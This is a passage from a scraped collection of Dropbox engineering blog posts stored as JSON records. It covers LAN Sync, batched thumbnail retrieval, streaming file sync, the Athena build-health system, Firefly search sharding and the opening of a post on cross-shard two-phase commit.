namespace we are trying to connect for? For this, we use [ Server Name Indication (SNI) ], so that the server knows which certificate to use. Note that in this diagram, the HEAD request seems useless, but when there is more than one peer, we need to avoid downloading block data twice. Also, the key distribution happens when the computer comes online, not only when using LAN Sync. SERVER/CLIENT Given this protocol, the server is not complicated. It just needs to know which blocks are present and where to find them. The client maintains a list of peers for each namespace (this list comes from the discovery engine). When the LAN Sync system gets a request to download a block, it sends a HEAD request to a random sample of the peers that it has discovered for the namespace, and then requests the block from the first one that responds saying it has the block. One important optimization to avoid the latency of an SSL handshake each time we need a block is to use connection pools to allow us to reuse already-started connections. We don’t open a connection until it is needed, and once it is open we keep it alive in case we need it again. Designing these pools was a good exercise in concurrency, since they needed to be able to give out connections or have them released back into the pool or be shut down when the connection died, all while being accessed from multiple threads. Of course, the most important thing is getting your files to you quickly, and we wouldn’t want a slow computer or connection on your network to slow things down. To this end, we have a fairly aggressive timeout on how long we are willing to wait before falling back to the block server. In addition, we limit the number of connections we are willing to make to any single peer, and how many peers we are willing to ask for a block. We made an effort to tune these parameters to work well, and they can be controlled by Dropbox’s servers if needed. Assuming that the block was found and downloaded successfully, we have successfully downloaded the block! Otherwise, we will try getting the block from Dropbox’s block server, as we normally do without LAN Sync. Can I Use It? LAN Sync is currently a part of the Dropbox app! It can be toggled from the Network tab of the preferences page. Because it is designed to be transparent to the user, you may have not even noticed it while it was handling your syncing. If you want to force a LAN Sync, you’ll need two computers on the network with either the same account or a shared folder in common. Add a file to one of the computers, and the other computer should attempt a LAN Sync. If you’re passionate about sync internals and performance you should check out our jobs page. We’re hiring . // Tags Infrastructure Performance Sync // Copy link Link copied Link copied", "date": "2015-10-13"},
{"website": "Dropbox", "title": "Improving Dropbox Performance: Retrieving Thumbnails", "author": ["Ziga Mahkovec"], "link": "https://dropbox.tech/infrastructure/retrieving-thumbnails", "abstract": "Request queuing Measuring performance Batching requests Results Dropbox brings your photos, videos, documents, and other files to any platform: mobile, web, desktop, or API. Over time, through automatic camera uploads on iOS and Android, you might save thousands of photos, and this presents a performance challenge: photo thumbnails need to be accessible on all devices, instantly. We pre-generate thumbnails at various resolutions for the different devices at upload time, to reduce the cost of scaling photos at rendering time. But when users are quickly scrolling through many photos, we need to request a large number of thumbnails. Since most platforms have limitations on the number of concurrent requests, the requests might get queued and cause slow render times. We present a solution that allows us to reduce the number HTTP requests and improve performance on all platforms, without major changes to our serving infrastructure. Request queuing Let’s look at this problem in more detail on the web, specifically the Photos tab at www.dropbox.com/photos . Here’s what the Network view in Chrome’s Developer Tools looks like if we were to load every photo thumbnail on the page individually: You can see that a limited set of images is loaded in parallel, blocking the next set of thumbnails from being loaded. If the latency of fetching each image is high—e.g. for users far away from our datacenters—loading the images can drastically increase the page load time. This waterfall effect is common for web pages loading lots of subresources, since most browsers have a limit of 6 concurrent connections per host name. A common workaround for web pages is to use domain sharding , spreading resources over multiple domains (in this case photos1.dropbox.com , photos2.dropbox.com , etc.) and thus increasing the number of concurrent requests. However, domain sharding has its downsides —each new domain requires a DNS resolution, a new TCP connection, and SSL handshake—and is also not practical when loading thousands of images and requiring many domains. We saw similar issues on our mobile apps: both iOS and Android have per-host or global limits on the number of concurrent connections. To solve the problem, we need to reduce the number of HTTP requests. This way we avoid problems with request queueing, make full use of the available connections, and speed up photo rendering. Measuring performance Before embarking on any performance improvement, we need to make sure we have all of the instrumentation and measurements in place. This allows us to quantify any improvements, run A/B experiments to evaluate different approaches, and make sure we’re not introducing performance regressions in the future. For our web application, we use the Navigation Timing API to report back performance metrics. The API allows us to collect detailed metrics using JavaScript, for example DNS resolution time, SSL handshake time, page render time, and page load time: Similarly, we log detailed timing data from the desktop and mobile clients. All metrics are reported back to our frontends, stored in log files and imported into Apache Hive for analysis. We log every request with metadata (e.g. the originating country of the request), which allows us to break down the metrics. Hive’s percentile() function is useful to look at the page load time distribution – it’s important to track tail latency in addition to mean. More importantly, the data is fed into dashboards that the development teams use to track how we’re doing over time. We instrumented our clients to measure how long it takes to load thumbnails. This included both page-level metrics (e.g. page render time) and more targeted metrics measured on the client (e.g. time from sending thumbnail requests to rendering all the thumbnails in the current viewport). Batching requests With the instrumentation in place, we set off on improving the thumbnail loading times. The first solution we had in mind was SPDY . SPDY improves on HTTP by allowing multiple multiplexed requests over a single connection. This solves the issue with request queueing and saves on round-trips (a single TCP connection and SSL handshake needs to be established for all the requests). However, we hit a few roadblocks on the way: We use nginx on our frontends. At the time, there was no stable nginx version with SPDY support. We use Amazon ELB for load balancing, and ELB doesn’t support SPDY. For our mobile apps, we didn’t have any SPDY support in the networking stack. While there are open-source SPDY implementations, this would require more work and introduce potentially risky changes to our apps. Instead of SPDY, we resorted to plain old HTTPS. We used a scheme where clients would send HTTP requests with multiple image urls (batch requests): Copy GET https://photos.dropbox.com/thumbnails_batch?paths=\n        /path/to/thumb0.jpg,/path/to/thumb1.jpg,[...],/path/to/thumbN.jpg The server sends back a batch response: Copy HTTP/1.1 200 OK\nCache-Control: public\nContent-Encoding: gzip\nContent-Type: text/plain\nTransfer-Encoding: chunked\n\n1:data:image/jpeg;base64,4AAQ4BQY5FBAYmI4B[...]\n0:data:image/jpeg;base64,I8FWC3EAj+4K846AF[...]\n3:data:image/jpeg;base64,houN3VmI4BA3+BQA3[...]\n2:data:image/jpeg;base64,MH3Gw15u56bHP67jF[...]\n[...] The response is: Batched : we return all the images in a single plain-text response. Each image is on its own line, as a base-64-encoded data URI . Data URIs are required to make batching work with the web code rendering the photos page, since we can no longer just point an <image> src tag to the response. JavaScript code sends the batch request with AJAX, splits the response and injects the data URIs directly into <image> src tags. Base-64 encoding makes it easier to manipulate the response with JavaScript (e.g. splitting the lines). For mobile apps, we need to base64-decode the images before rendering them. Progressive with chunked transfer encoding: on the backend, we fire off thumbnail requests in parallel to read the image data from our storage system. We stream the images back the moment they’re retrieved on the backend, without waiting for the entire response to be ready; this avoids head-of-line blocking, but also means we potentially send the images back out of order. We need to use chunked transfer encoding , since we don’t know the content length of the response ahead of time. We also need to prefix each line with the image index based on the order of request urls, to make sure the client can reorder the responses. On the client side, we can start interpreting the response the moment the first line is received. For web code we use progressive XMLHttpRequest ; similarly for mobile apps, we simply read the response as it’s streamed down. Compressed : we compress the response with gzip. Base64-encoding generally introduces 33% overhead. However, that overhead goes away after gzip compression. The response is no longer than sending the raw image data. Cacheable : we mark the response as cacheable. When clients issue the same request in the future, we can avoid network traffic and serve the response out of cache. This does require us to make sure the batches are consistent however - any change in the request url would bypass the cache and require us to re-issue the network request. Results Since the scheme is relatively simple and uses plain HTTPS instead of SPDY, it allowed us to deploy it on all platforms and we saw significant performance improvements: 40% page load time improvement on web. However, we don’t see this as a long-term strategy - we’re planning on adding SPDY support to all of our clients and take care of pipelining at the protocol level. This will simplify the code, give us similar performance improvements and better cacheability (see note about consistent batches above). The Dropbox performance team is a small team of engineers focused on instrumentation, metrics and improving performance across Dropbox’s many platforms. If you obsess over making things faster and get excited when graphs point down and to the right, join us ! // Tags Infrastructure Performance // Copy link Link copied Link copied", "date": "2014-01-27"},
{"website": "Dropbox", "title": "Streaming File Synchronization", "author": ["Nipunn Koorapati"], "link": "https://dropbox.tech/infrastructure/streaming-file-synchronization", "abstract": "Dropbox File Format The Server File Journal (SFJ) High Level Changes Protocol changes Metaserver changes Client changes Great we’re done! How much does streaming sync help? Is it released? Our users love Dropbox for many reasons, sync performance being chief among them. We’re going to look at a recent performance improvement called Streaming Sync which can improve sync latency by up to 2x. Prior to Streaming Sync, file synchronization was partitioned into two phases: upload and download. The entire file must be uploaded to our servers and committed to our databases before any other clients could learn of its existence. Streaming sync allows file contents to “stream” through our servers between your clients. The Dropbox File System First we’ll discuss the way Dropbox stores and syncs files. On your local machines, Dropbox attempts to conform to the host file system on your system. However, especially considering that Dropbox supports shared folders, the server side Dropbox file system has a different abstraction. Unlike a traditional file system, a relative path is insufficient. We define a namespace to be an abstraction for the root directory of a more traditional file system directory tree. Each user owns a root namespace. In addition, every shared folder is a namespace which can be mounted within one or many root namespaces. Note that users own namespaces and not vice versa. With this abstraction, every file and directory on the Dropbox servers can be uniquely identified by two values: a namespace and a relative path. Dropbox File Format Every file in Dropbox is partitioned into 4MB blocks, with the final block potentially being smaller. These blocks are hashed with SHA-256 and stored. A file’s contents can be uniquely identified by this list of SHA-256 hashes, which we refer to as a ‘blocklist’. Here, the blocklist for video.avi is ‘h1,h2,h3,h4’, where h1, h2, h3, and h4 represent hashes of the blocks b1, b2, b3, and b4. The Server File Journal (SFJ) This is our big metadata database which represents our file system! Note that it doesn’t contain file contents, just blocklists. It is an append-only record where each row represents a particular version of a file. The key columns in the schema are: Namespace Id (NSID) Namespace Relative Path Blocklist Journal ID (JID): Monotonically increasing within a namespace Dropbox server types There are two types of servers relevant to this discussion: Block data server: Maintains a key-value store of hash to encrypted contents. No knowledge of users/files/how those blocks fit together. Metadata server: Maintains database of users, namespaces, and of course SFJ The servers communicate via internal RPCs when necessary. Dropbox Desktop Client Protocol First, we will discuss the protocol prior to streaming sync, to motivate this work. Each desktop client keeps a cursor (a JID) of its location in SFJ for each of its namespaces, which allows it to communicate how ‘up-to-date’ it is with the server. First, let’s discuss what happens on an uploading client when a file appears! The client first attempts to ‘commit’ the blocklist to the server under the (namespace, path). The metaserver checks to see if a) Those hashes are known. b) This user/namespace has access. If not, the commit call returns “need blocks” indicating which blocks are missing. For brand new files, this is often all of them. The uploading client must talk directly with the blockserver in order to add these blocks. We limit the number of bytes per request*, so this may take multiple requests. * In this diagram, there is a limit of 8MB, but we’ve experimented with other values as well. Finally, the client attempts the commit again. This time, it should definitely work. The metaserver will update SFJ with a new row. Congratulations, the file officially exists in Dropbox! Now let’s check out the downloading client. When the client finds out* that updates are available, it will make a “list” call to learn about the new SFJ rows. The call to list takes in the cursors for each namespace as input so that only new entries are returned. * Idle clients maintain a longpoll connection to a notification server. Awesome. There’s a new file. We need to reconstruct the file from the blocks. The downloading client first checks to see if the blocks exist locally (within existing files, or in our deleted file cache). For new files, these checks likely fail, and the client will download directly from the blockserver. The blockserver verifies that the user has access to the blocks and provides them. Similar to store_batch, this may take multiple requests. Now that the client has all the blocks, it can reconstruct the file and add it to the local file system. We’re done! We just demonstrated how a single new file is synced across clients. We have separate threads for sniffing the file system, hashing, commit, store_batch, list, retrieve_batch, and reconstruct, allowing us to pipeline parallelize this process across many files. We use compression and rsync to minimize the size of store_batch/retrieve_batch requests. To sum up the process, here’s the whole thing on one diagram: Streaming Sync Typically, for large files, the sync time is dominated by the network time on calls to store and retrieve. The store_batch calls must occur before the SFJ commit. The list call is only meaningful after the SFJ commit. However, retrieve_batch’s dependency on commit is unnecessary. This pointed us toward an optimization which we call Streaming Sync. We want to overlap work on each of the clients. Ideally the downloading client could always be just one blockserver network call behind the uploading client. That looks better! What do we have to do to make this possible? High Level Changes We’re going to maintain metaserver state (separate from SFJ) from the initial failed commit from the UL Client. This will allow the DL Client to make progress prior to the SFJ commit. The DL Client will “prefetch” blocks that are part of these not-yet-committed files. Thus, when the SFJ commit occurs, the DL Client will be (nearly) done already. Lovely! Protocol changes Turns out the uploading client doesn’t need to change its behavior. However, the downloading client needs to hear about non-SFJ changes. We handled this by adding additional output to list. List now returns new SFJ rows as well as new Streaming Sync prefetchable blocklists. Metaserver changes We decided to store the additional state in memcache rather than a persisted table. It is not vital that this data persists, and we chose not to incur the additional cost of writing to a table on a failed commit. The memcache entry looks very similar to an SFJ row, except it is versionless. Thus there is no need for a JID. Writes to memcache occur on failed calls to commit Reads from memcache occur on list Deletes occur on successful calls to commit (or memcache evictions) Client changes Clients must now maintain a “prefetch cache” of blocks which do not correspond to files in SFJ. Upon list, a client queues up prefetches, which go into this prefetch cache. On new versions of the client, you can find this in the “.dropbox.cache/prefetch_cache/” directory. Great we’re done! Nope. Not quite. There’s a few more things left to discuss. We’ve only talked about the “normal” case where a file actually completes being uploaded. We need to make sure that even if the file never completes commit, we don’t break the process. Imagine starting an upload and changing your mind midway. We need to make sure that the server side memcache expires entries and does not thrash. Furthermore, we need the DL client’s prefetch cache to be purged periodically and intelligently so it does not grow unbounded. When accessing blocks, we check validity against the memcache table, but since memcache entry may be mutated, unavailable, expired, or even evicted during the prefetch, we need to arrange fallback behavior on the client when the server cannot verify that a block is eligible for streaming sync. This involved adding special return codes to the store protocol to indicate this condition. How much does streaming sync help? We found that streaming sync only affects files that are large enough to require multiple store/retrieve requests, so we limited the feature to large new files. Streaming sync provides an up-to-2x improvement on multi-client sync time. The improvement approaches 2x as the file’s size increases given equal UL/DL bandwidth, but in practice, the speedup is limited by the slower side of the connection. We did a test across two machines with the same network setup, (~1.2 mb/s UL, ~5 mb/s DL). There is an approximately 25% improvement on sync time. File Size (MB) Sync time (s) with streaming sync Sync time (s) without streaming sync 20 21 25 40 30 37 100 64 89 500 293 383 As we roll out this feature to the world, we’ll be tracking key metrics like number of prefetched blocks, size of the prefetch cache, and memcache hit/miss rates. Is it released? You can find client side support for streaming sync in beta version 2.9 of the desktop client and stable version 2.10. We plan to roll out server side support over the course of the next couple of weeks. If you’re excited about sync performance work like this, we're hiring ! // Tags Infrastructure Performance Sync // Copy link Link copied Link copied", "date": "2014-07-10"},
{"website": "Dropbox", "title": "Athena: Our automated build health management system", "author": ["Utsav Shah"], "link": "https://dropbox.tech/infrastructure/athena-our-automated-build-health-management-system", "abstract": "A flaky test that occasionally times out At Dropbox, we run more than 35,000 builds and millions of automated tests every day. With so many tests, a few are bound to fail non-deterministically or “flake.” Some new code submissions are bound to break the build, which prevents developers from cutting a new release. At this scale, it’s critical we minimize the manual intervention necessary to temporarily disable flaky tests, revert build-breaking commits, and notify test owners of these issues. We built a system called Athena to manage build health and automatically keep the build green. What we used to do To ensure basic correctness, all code at Dropbox is subjected to a set of pre-submit tests. A larger suite of end-to-end tests, like Selenium/UI tests, which are too flaky, slow, and costly to test before code changes are only run after code lands on the master branch, and we call these “post-submit” tests. We require both pre-submit and post-submit tests to pass to cut a new release. To keep the build green, we initially established a rotation which reverted commits that broke post-submit tests and temporarily disabled, or “quarantined” flaky tests. Over time, the operational load of that rotation became too high, and we distributed the responsibility to multiple teams which all felt the burden of managing build health. Also, ineffective manual intervention to quarantine flaky tests made pre-submit testing a slow, frustrating experience. So we started brainstorming for a sustainable solution. Enter Athena We landed on a new service, called Athena , which manages the health of our builds and requires minimal human intervention. Athena reduces the human effort required to keep the build green by: Identifying commits that make a test deterministically fail, and notifying the author to revert the commit Identifying tests that are flaky and unreliable, and automatically quarantining them What makes this tricky? It can be challenging to determine whether a single test failure is a deterministic breakage or a spurious failure. Ultimately, a test is arbitrary user code, and tests can fail in various ways. The three main classes of non-deterministic test failures we see are non-hermetic tests, flaky tests, and infrastructural flakiness. Non-hermetic tests Hermetic tests only use declared dependencies and have no dependencies outside the build and test environment, which make their results reproducible. A few tests at Dropbox depend on external resources that are hard to fake, like time. We often see tests that start failing when it’s a new UTC day, or at the end of every month. For example, code that tests whether a particular discount is valid starts failing after the discount expires. We call these environmental failures. We mitigate these by keeping track of the latest “stable” commit, one where all tests have passed. Every time a new commit has all tests passing, we mark that commit as stable. If a test fails when run on a stable commit, it can indicate non-hermetic behavior or an environmental failure. Flaky tests Flaky tests are tests that behave non-deterministically with no change in input. Potential sources of non-determinism are dependence on random numbers, thread scheduling, improperly selected timeouts, and concurrency. With flaky tests, it’s impossible to say with 100% confidence whether a commit truly broke a test. We mitigate this by retrying the same test up to ten times, and if the result isn’t consistent across the runs, we’re confident that the test is exhibiting a flake. We settled on ten retries after some experimentation. Infrastructural flakiness We have done a lot of work over the years to ensure that our tests have reliable resource guarantees so that their behavior is consistent. We run tests in a container, give them consistent CPU and memory via resource quotas, and do CPU and NUMA pinning. Unfortunately, with a thousand node cluster, we’re bound to have performance variations and straggling hosts. T he most common case of infrastructural flakiness we see is a test timing out on a poorly performing host. We mitigate this by retrying the test on a different host. How does Athena work? To apply the mitigations listed above, we created a service, Athena, that watches test results, reruns failing tests to identify if they’re flaky or broken, and takes actions like quarantine. Athena watches test results for all new code submissions and marks tests that fail more than once within a few hours in post-submit testing as “noisy”, which is a temporary state while the system is unsure if the test failures are flakes, infrastructural, or a breakage. Noisy tests are temporarily ignored in our pre-submit tests but continue running post-submit and contributing to the overall build status. This system reduces rejections in new code submissions, saving developers from wasting time investigating failures that aren’t their fault, while also ensuring that we don’t ship a broken release. Flake Detection To determine whether a test is flaky, we rerun it on a commit where it has passed before. The test is quarantined if it flaps from passing to failing across multiple hosts. To deal with environmental failures, the test is rerun on the latest stable commit. Breakage Detection Breakage detection is more involved. For every noisy test, we run a bisect to find a potential transition point where the test went from pass to fail, and we rerun the test there ten times to confirm it’s truly broken and not just flaky. This Python pseudocode explains the breakage detection algorithm below. Copy def find_offending_commit(test, commits, latest_stable_commit):    \n    # commits where the test might have transitioned from pass to fail\n    potential_transition_points = [] \n\n    for commit in reversed(commits):\n      if is_test_failing(test, commit) or is_test_unknown(test, commit):\n          potential_transition_points.append(commit)\n      else:\n        # if we see a pass, we're guaranteed not to have broken the commit before\n        # this point\n        break\n\n    if not potential_transition_points:\n      return NoIssues() # the test isn't broken\n\n    if len(potential_transition_points) == 1:\n      # potential culprit\n      commit = potential_transition_points[0]\n\n      # deflake the test: run it 10 times to confirm it's broken\n      is_failure = trigger_test(test, commit, deflake_num_runs=10)\n      if not is_failure:\n        return NoIssues() # just a flake\n\n      # rerun on the stable commit to confirm it's not environmental issues\n      is_failure = trigger_test(test, latest_stable_commit)\n      if not is_failure:\n        return Breakage(test=test, commit=commit)     \n\n    # bisect logic\n    midpoint = (len(potential_transition_points) / 2) - 1\n    middle = potential_transition_points[midpoint]\n\n    is_failure = is_test_failing(test, middle, run_if_unknown=True)\n\n    # run bisect with a limited set\n    if is_failure:\n      new_candidates = potential_transition_points[:midpoint+1]\n    else:\n      new_candidates = potential_transition_points[midpoint+1:]\n\n    return find_offending_commit(test, new_candidates, latest_stable_commit) How did it work out? We’ve been running Athena for a few months in production now, and we’ve doubled the number of test quarantines and removed the need for manual test quarantines from our team. Operational Overhead We quarantine much more aggressively than we ever have, which might be alarming. In reality, this is required to keep pre-submit tests free from spurious flakes and applies a consistent quality bar to all of our tests. Athena doesn’t auto-revert commits, but it sends a message to the author and the team that owns the test suite. While reverting would be simple to automate, getting the build back to stable is not time sensitive (since broken test results are ignored in pre-submit) and might interfere with a forward fix for a critical issue, so we skipped that for now. Capacity We used to automatically run our most expensive tests (such as Selenium UI tests) on most commits to make it easy for humans to identify breakages. Athena allowed us to experiment with “rate limiting” these, instead running the test suite at most once every ten minutes. However, this meant that teams lost the ability to visually scan and quickly find commits that broke a test. Additionally, Athena didn’t expose any information about its progress, which led to lack of trust in the system (“is it actually doing anything?”). To resolve the issue, we added a simple UI to visualize progress. This helped the developers know that Athena is chugging along. This also made Athena self serve, which reduced support load on us. Rate limiting ensures that capacity use in continuous integration (CI) grows slowly, and reduces the spikiness in demand for hosts in peak hours. Overall, we reduced our testing cluster size by ~8%. What’s next? We have not yet applied Athena to our desktop tests, so we plan to do that next. This will involve understanding new failure modes, such as different OSs and their variants. For breakage detection, even though we do a bisect today, some clusters have enough spare capacity that we can do an “n-sect” to run tests across all possible transition points in parallel to catch breakages faster. Finally, we want to experiment with auto-revert if the build has stayed broken for a few hours since in theory that should not interfere with a critical fix. Conclusion CI enables our organization to release quickly and safely, but it can also impose work for managing the build, frustration due to flaky pre-submit failures, and significant machine costs. Simple automation like Athena helps significantly cut down on those costs. What we learned: Keep notifications high-signal (accurate) : It’s very easy to spam developers with inaccurate or un-actionable notifications that they will be trained to ignore. High-signal notifications help keep trust in the system high and drive manual action Automation helps reduce bikeshedding : Just as formatters like gofmt help avoid debates about code style, automation for quarantine helps maintain a high bar of test quality in our test suites, without debate as to what warrants quarantining and why Indicate progress for long running actions: Any long running, asynchronous workflow requires some kind of indication that it’s not stuck, helping to reduce user confusion, and maintain trust that the system is doing its job Credits A lot of the ideas here come from Facebook’s talk at GTAC 2014 . Special thanks to Roy Williams for this talk, which inspired us to build our auto-quarantine and noisy test ignoring system and taught us the power of automation to reduce bikeshedding. This work wouldn’t be possible without the various papers and constant support from John Micco, who helped us with the design of the breakage detection system, and the CI primitives required to make this a reality. Also, thanks to our ex-intern Victor Ling, who built the first prototype of Athena, and George Caley, who added significant features like ignoring noisy tests in pre-submit, auto-quarantine, and the simplified UX. Are you interested in working on Developer Infrastructure at scale? We’re hiring ! // Tags Infrastructure Build Systems Productivity // Copy link Link copied Link copied", "date": "2019-05-22"},
{"website": "Dropbox", "title": "Firefly: Instant, Full-Text Search Engine for Dropbox (Part 1)", "author": ["Samir Goel"], "link": "https://dropbox.tech/infrastructure/firefly-instant-full-text-search-engine", "abstract": "Introduction Goals Wait, why is this a hard problem? How do you slice the search index? Leveraging open-source solutions Summary Introduction With hundreds of billions of files, Dropbox has become one of the world's largest stores of private documents, and it’s still growing strong! As users add more and more files it becomes harder for them to stay organized. Eventually, search replaces browsing as the primary way users find their content. In other words, the more content our users store with us the more important it is for them to have a powerful search tool available. With this motivation in mind, we set out to deploy instant, full-text search for Dropbox. Like any serious practitioners of large distributed systems our first order of business was clear: come up with a name for the project! We settled on Firefly . Today, Firefly powers search for all Dropbox for Business customers. These are the power users of Dropbox that collectively own tens of billions of documents. This blog post is the first in a series that will touch upon the most important aspects of Firefly. We will start by covering its distinguishing characteristics and explain why these lead to a non-trivial distributed system. In subsequent blog posts, we will explain the high-level architecture of the system and dive into specific details of our implementation. Goals There are three dimensions that determine the complexity of a search engine: Scale: The total number of documents that are represented in the search index (typically an inverted index used to efficiently perform search). From the perspective of a Search Engine, files of all types (docx, pdf, jpg, etc) are colloquially referred to as documents. Query latency: The time taken by the system to respond to a search. Indexing latency: The time taken by the system to update the search index to reflect changes, such as the addition or modification of a document. We want Firefly to be the one system that powers searches for all our users and we want it to be blazing fast -- our goal is to have serving latency under 250 msecs at the 95th percentile (i.e., 95 percent of all searches should take less than 250 msecs). For a compelling user experience we also want it to index a document “instantly”. That is, additions or modifications to a Dropbox should be reflected in search results in under 10 secs (95th percentile). In essence: we set a goal to build a search engine that performed well in all three dimensions. What could possibly go wrong? :) Wait, why is this a hard problem? At first glance, this might seem like a simple problem for Dropbox. Unlike a web search engine (such as Google), every search query only needs to cover the set of documents a user has access to. So why not just build and maintain a separate index for each Dropbox user with each stored in a separate file on disk? After all, one would rightly expect the distribution of Dropbox sizes across our user base to follow a Zipf distribution — a large fraction of users would have a small number of documents in their Dropbox. For these users, the corresponding search index would be relatively small and therefore easy to build and update as documents are added or modified. There are two main drawbacks of this approach. Firstly, we expect some users to have a large number of documents in their Dropbox, making it non-trivial to update their corresponding index “instantly”. Secondly, this approach requires the system to maintain as many indices as there are users with each stored in a separate file. With over 300 million users, keeping track of so many indices in production would be an operational nightmare. We like to sweat the details here at Dropbox and would hate for even one of our customers to have problems searching because of an issue on our side. Having such a large number of index files would impair our ability to effectively and precisely monitor issues affecting a small fraction of our users. Clearly we need a design that will create fewer search indices but now we have another problem: if we slice the complete search index into 1000 pieces each piece becomes pretty large (reflecting the Dropbox content for over 100 thousand users). How do we update such a large index “instantly”? To achieve this goal we need a system that supports incrementally updating the search index: a challenging task with billions of documents and millions of users. How do you slice the search index? In the discussion above we concluded that for the system to be both fast and operationally viable we needed a relatively small number of slices. In this section we take up a related question: what is a good way to slice the search index? In other words, how do we assign documents to a given slice? In distributed systems parlance the slices are commonly called shards and the deterministic function which maps a document to a shard is called a sharding function . One additional dimension of complexity is that a Dropbox user may choose to share a folder with multiple other users. Files in a shared folder appear in each member’s Dropbox. So if we picked a sharding function based on user-id, a shared file would appear in the index multiple times, one for each user that has access to it. For efficiency, we wanted each user file to appear exactly once in the index. As a result, we chose a sharding function based on “namespace”. A namespace is a widely used concept in our production systems. Internally, we represent a user’s Dropbox as a collection of namespaces. Each namespace consists of files and directories, along with a directory structure, and is mounted at a certain directory path within a user’s Dropbox. In the simplest case, a user’s Dropbox consists of just one namespace mounted at “/”, which is called the “Root” namespace. The concept of a namespace makes it easy to support the notion of shared folders. Each shared folder in Dropbox is represented by a separate namespace. It is mounted at a certain directory path within the “Root” namespace for all users with whom the folder has been shared. Dropbox manages billions of namespaces. We use a standard hash function as our sharding function to divide them into a relatively small set of shards. By pseudo-randomly distributing namespaces across shards, we expect the shards to be roughly similar in terms of properties such as number of documents, average document size, etc. Since namespaces are already divided into shards, we can take advantage of this structure and generate a search index per shard. To process a given user’s query, we first determine the namespaces a user is able to access. These namespaces may belong to different shards. Then, we use the sharding function to find these namespace shards and use the corresponding search indices to answer the query. Conceptually, the search index contains the mapping: {token => list of document IDs} . If a user with access to namespace with ID ns1 issues the query “san francisco” , we tokenize it into tokens: \"san\" and \"francisco\" , and process it by intersecting the corresponding list of document IDs. We would then discard all document IDs that do not belong to namespace ns1 . This is still inefficient, as a shard typically contains a large number of namespaces (in the millions), while a user typically has access to a handful of namespaces. To make the query processing even faster, we prefix each token in the search index with the ID of its namespace: {namespace-id:token => list of document IDs} . This corresponding list of documents contains only those that contain the token and are also present in the namespace. This allows us to focus our processing on the subset of the search index that is relevant to the set of namespaces that belong to the user. For example, if a user with access to the namespace with id ns1 issues the query “san francisco” , we process it by intersecting the list of document IDs for tokens: \"ns1:san\" and \"ns1:francisco\" . Leveraging open-source solutions Before we embarked on building Firefly, we considered whether we should leverage an off-the-shelf open-source search engine ( SolrCloud , ElasticSearch , etc). We evaluated many of these solutions and decided to build our own for two main reasons. Firstly, none of these solutions is currently deployed at a scale comparable to ours. And secondly, a system built from scratch gives us control over design aspects that have significant impact on the machine footprint, performance, and operational overhead. Also, search is a foundational feature for many of our products, current and planned. Instead of setting up and maintaining a separate search system for each of these, over time we intend to extend Firefly into a “search service”. This will allow us to quickly enable search over new corpora. Having said that, we do leverage a number of open-source components in the implementation of Firefly (e.g., LevelDB , HDFS , HBase , RabbitMQ , Apache Tika ). We will go into the details of our use of these in subsequent blog posts. Summary Today, Firefly has been in production for several months and powers search for all Dropbox for Business users.  We have designed it to be a horizontally scalable system. It is able to comfortably meet the goals for serving and indexing latency that we set for ourselves. In this post, we discussed the key requirements for Firefly and the motivations behind them. We also explained why meeting these requirements was not easy and described our sharding strategy in some detail. In subsequent posts, we will cover the overall design of Firefly and detail the components that enable it to be a scalable, robust and instant search system. We will describe how Firefly scales horizontally to support growth as well as gracefully handle different types of failures. There is always more to be done to support Dropbox’s growth and optimize the performance of our systems — if these type of problems are your cup of tea, join us ! Firefly was built by a very small team — Firefly infrastructure was built by the two of us with help from Adam Faulkner (our intern , who recently joined us full-time!). If you are interested in working in a small team and making a large impact come talk to us . Contributors: Abhishek Agrawal, Adam Faulkner, Franck Chastagnol,  Lilian Weng, Mike Lyons,  Rasmus Andersson, Samir Goel // Tags Infrastructure Performance Search Engine Instant Search // Copy link Link copied Link copied", "date": "2015-03-22"},
{"website": "Dropbox", "title": "Cross shard transactions at 10 million requests per second", "author": ["Daniel Tahara"], "link": "https://dropbox.tech/infrastructure/cross-shard-transactions-at-10-million-requests-per-second", "abstract": "Two-phase commit Making two-phase commit practical Deploying to a live system Limitations Conclusion Dropbox stores petabytes of metadata to support user-facing features and to power our production infrastructure. The primary system we use to store this metadata is named Edgestore and is described in a previous blog post, (Re)Introducing Edgestore . In simple terms, Edgestore is a service and abstraction over thousands of MySQL nodes that provides users with strongly consistent, transactional reads and writes at low latency. Edgestore hides details of physical sharding from the application layer to allow developers to scale out their metadata storage needs without thinking about complexities of data placement and distribution. Central to building a distributed database on top of individual MySQL shards in Edgestore is the ability to collocate related data items together on the same shard. Developers express logical collocation of data via the concept of a colo , indicating that two pieces of data are typically accessed together. In turn, Edgestore provides low-latency, transactional guarantees for reads and writes within a given colo (by placing them on the same physical MySQL shard), but only best-effort support across colos. While the product use-cases at Dropbox are usually a good fit for collocation, over time we found that certain ones just aren’t easily partitionable. As a simple example, an association between a user and the content they share with another user is unlikely to be collocated, since the users likely live on different shards. Even if we were to attempt to reorganize physical storage such that related colos land on the same physical shards, we would never get a perfect cut of data. A sharing relationship stored in Edgestore spanning two MySQL shards. For data that was not easily collocatable, developers were forced to implement application-level primitives to mask over a lack of cross-shard transactionality, slowing down application development and incurring an unnecessary technical burden. This blog post focuses on our recent deployment of cross shard transactions , which addressed this deficiency in Edgestore’s API, allowing atomic transactions across colos. What follows is a description of our design, potential pitfalls one may encounter along the way, and how we safely validated and deployed this new feature to a live application serving more than ten million requests per second. Two-phase commit The standard protocol for executing a transaction across database shards is two-phase commit , which has existed since at least the 1970s. We applied a modified version of this protocol to support cross-shard transactions in Edgestore. Two-phase commit requires a leader to execute a transaction across multiple participants , in our case Edgestore shards. The protocol works as follows: Two-phase commit with a transaction record. Phase 0: Transaction Record Leader writes a durable transaction record indicating that a cross-shard transaction is about to happen. The addition of an external transaction record to serve as a source of truth about the state of a transaction is the main way in which our protocol differs from standard two-phase commit. This phase isn’t required in the standard protocol but provides both performance and correctness benefits in our use-case, which we’ll describe below. After writing the transaction record, the protocol follows its traditional path: Phase 1: Commit Staging All participants write a durable record that they are willing to commit the transaction and then notify the leader of their intent to commit. At this point the participants have indicated that they are willing to commit the transaction, but they don’t yet know if the leader has decided to commit it or not. To ensure correctness they must ensure that no other concurrent transactions can observe state that conflicts with the ultimate commit or abort decision made by the leader; we’ll refer to this below as filtering . Phase 2a: Transaction Decision After receiving a response from all participants, the leader updates the durable transaction record to signify that the transaction is committed. (If it doesn’t receive a response from all participants it can instead mark the transaction as aborted.) Like Phase 0, Phase 2a is not strictly required by the two-phase commit protocol but makes the commit point explicit. This means that even if all participants agree to the transaction and stage the mutations, the transaction is not considered committed until the transaction record is updated to reflect that. In consequence, any parallel operation can abort a transaction at any time up until the transaction record leaves its pending state, which makes recovery in the 